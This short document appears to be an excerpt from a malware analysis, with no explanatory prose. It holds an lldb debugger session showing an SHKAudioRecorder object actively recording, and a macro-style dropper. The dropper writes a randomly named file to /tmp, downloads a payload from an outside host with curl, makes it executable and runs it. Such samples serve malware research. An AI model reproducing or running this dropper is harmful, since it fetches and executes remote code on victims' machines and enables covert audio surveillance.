```
(lldb) **po [0x100729040 className]**
SHKAudioRecorder

(lldb) **p (BOOL)[0x100729040 isRecording]**
(BOOL) $19 = YES 
```

```
sur = "https://nzssdm.com/assets/mt.dat"
spath = "/tmp/"
i = 0

Do
    spath = spath & Chr(Int(Rnd * 26) + 97)
    i = i + 1
Loop Until i > 12

system("curl -o " & spath & " " & sur)
system("chmod +x " & spath)
popen(spath, "r") 
```
